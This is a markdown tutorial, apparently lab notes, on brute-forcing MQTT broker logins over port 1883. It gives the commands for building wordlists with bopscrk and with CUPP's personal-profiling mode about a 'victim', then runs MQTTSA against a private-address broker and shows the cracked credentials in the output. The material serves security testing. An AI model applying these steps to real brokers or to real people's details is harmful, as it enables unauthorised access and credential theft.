### Brute Force MQTT

This only works with MQTT over 1883 (Which is by the way not recommended for secure implementations)
  
- Generate passwords to brute force
    - Option 1: Use [bopscrk (Before Outset PaSsword CRacKing)](https://github.com/r3nt0n/bopscrk)
        
        - Clone the repo
            ``` bash
            git clone https://github.com/r3nt0n/bopscrk.git
            ```
        - Change directory
            ``` bash
            cd bopscrk
            ```
        - Chreate a .txt file with passwords (python 3 required)
            ``` bash
            python3 bopscrk.py -w micro,foo,raspberry,fab,password,1,12,123,1234,12345,123456,1234567,12345678,123456789
            ```

    - Option 2: Use [CUPP - Common User Passwords Profiler](https://github.com/Mebus/cupp) to generate passwords:
    
        - Clone the repo
            ``` bash
            git clone https://github.com/Mebus/cupp.git
            ```
        - Change directory
            ``` bash
            cd cupp
            ```
        - Create passwords (Python 3 required)
            ``` bash
            python3 cupp.py -i
            ```
        - Interactive questionsaire mode
            ``` bash
             ___________ 
               cupp.py!                 # Common
                  \                     # User
                   \   ,__,             # Passwords
                    \  (oo)____         # Profiler
                       (__)    )\   
                          ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                                        [ Mebus | https://github.com/Mebus/]
            
            
            [+] Insert the information about the victim to make a dictionary
            [+] If you don't know all the info, just hit enter when asked! ;)
            
            > First Name: Max 
            > Surname: Mustermann
            > Nickname: 
            > Birthdate (DDMMYYYY): 01021995
            
            
            > Partners) name: 
            > Partners) nickname: 
            > Partners) birthdate (DDMMYYYY): 
            
            
            > Child's name: 
            > Child's nickname: 
            > Child's birthdate (DDMMYYYY): 
            
            
            > Pet's name: Gringo
            > Company name: Campus
            
            
            > Do you want to add some key words about the victim? Y/[N]: foo,microfab,raspberrypi 
            > Do you want to add special chars at the end of words? Y/[N]: Y
            > Do you want to add some random numbers at the end of words? Y/[N]:Y
            > Leet mode? (i.e. leet = 1337) Y/[N]: N
            
            [+] Now making a dictionary...
            [+] Sorting list and removing duplicates...
            [+] Saving dictionary to max.txt, counting 5928 words.  
            ```
- Brute Force Client
    - Clone the [MQTTSA](https://github.com/stfbk/mqttsa) repo
        ``` bash
        git clone https://github.com/stfbk/mqttsa.git 
        ```
    - Change directory
        ``` bash
        cd mqttsa
        ```
    - Execute brute force on Broker:
        ``` bash
        python3 mqttsa.py 192.168.88.100 -p 1883 -u pubclient -w password.txt
        ```
    - Output - Our user:password (pubclient:microfoo123) was found. We could now publish data to the broker using these credentials
        ``` bash
        Performing brute force (press ctrl+c once to skip)
        trying: pubclient, micro
        trying: pubclient, raspberry
        trying: pubclient, password
        trying: pubclient, microfoo123
        trying wildcard username: #
        Attempting the connection with: [pubclient,microfoo123]
        10 seconds connection timeout (press ctrl+c once to skip)
        Connected successfully using password found with brute force.
        ```
    - We also get a .pdf report lists all the information from our attack